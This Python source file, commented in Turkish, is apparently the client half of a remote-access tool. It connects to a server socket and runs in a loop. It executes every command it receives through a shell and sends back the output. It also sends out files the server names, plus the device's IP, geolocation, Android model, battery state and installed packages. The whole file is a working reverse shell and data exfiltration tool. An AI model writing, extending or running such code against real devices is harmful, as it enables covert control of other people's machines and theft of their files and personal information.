import socket
import os
import platform
import pyfiglet
import requests
import subprocess
from colorama import Fore, Style, init
from pyfiglet import figlet_format

# Colorama'nın otomatik olarak terminali desteklemesini sağlar
init()

# Ekranı temizle
os.system('cls' if os.name == 'nt' else 'clear')

# Logo oluşturuluyor
logo = figlet_format("Client", font="starwars")
print(Fore.CYAN + logo + Style.RESET_ALL)

# İstemci ayarları
host = '127.0.0.1'
port = 12336

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((host, port))

print(Fore.GREEN + "Bağlantı sağlandı." + Style.RESET_ALL)

def get_ip_and_location():
    try:
        response = requests.get('https://ipinfo.io/json')
        data = response.json()
        ip_info = f"IP: {data.get('ip')}\nKonum: {data.get('city')}, {data.get('region')}, {data.get('country')}"
        return ip_info
    except requests.RequestException as e:
        return f"Hata: {str(e)}"

def run_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout + result.stderr
    except Exception as e:
        return f"Hata: {str(e)}"

def get_device_info():
    info = ""
    # Cihaz Bilgisi
    device_info = run_command('cat /system/build.prop | grep "model"\ncat /system/build.prop | grep "manufacturer"\ngetprop ro.build.version.release')
    info += f"Cihaz Bilgisi:\n{device_info}\n"

    # Depolama Bilgisi
    storage_info = run_command('df -h')
    info += f"Depolama Bilgisi:\n{storage_info}\n"

    # Pil Durumu
    battery_info = run_command('dumpsys battery')
    info += f"Pil Durumu:\n{battery_info}\n"

    # Uygulama Bilgileri
    app_list = run_command('pm list packages')
    info += f"Yüklenmiş Uygulamalar:\n{app_list}\n"

    return info

while True:
    try:
        data = client_socket.recv(1024).decode()
        
        if not data:
            break
        
        if data.startswith('UPLOAD '):
            filename = data.split(' ', 1)[1]
            if os.path.exists(filename):
                with open(filename, 'rb') as f:
                    while True:
                        file_data = f.read(1024)
                        if not file_data:
                            break
                        client_socket.send(file_data)
                # Dosya gönderimi sonrası bir bitiş sinyali göndermek
                client_socket.send(b'EOF')
                print(Fore.GREEN + f"Dosya {filename} gönderildi." + Style.RESET_ALL)
            else:
                print(Fore.RED + f"Hata: Dosya {filename} bulunamadı." + Style.RESET_ALL)
        
        elif data == 'INFO':
            local_ip = socket.gethostbyname(socket.gethostname())
            public_ip = socket.gethostbyname(socket.getfqdn())
            system_info = platform.platform()
            location_info = get_ip_and_location()
            device_info = get_device_info()
            info = (f"Yerel IP: {local_ip}\n"
                    f"Kamu IP: {public_ip}\n"
                    f"Sistem Bilgisi: {system_info}\n"
                    f"{location_info}\n"
                    f"{device_info}")
            client_socket.send(info.encode())
        
        elif data == 'EXIT':
            break
        
        else:
            try:
                output = run_command(data)
                client_socket.send(output.encode())
            except Exception as e:
                client_socket.send(f"Hata: {str(e)}".encode())
    
    except Exception as e:
        client_socket.send(f"Hata: {str(e)}".encode())
        break

client_socket.close()
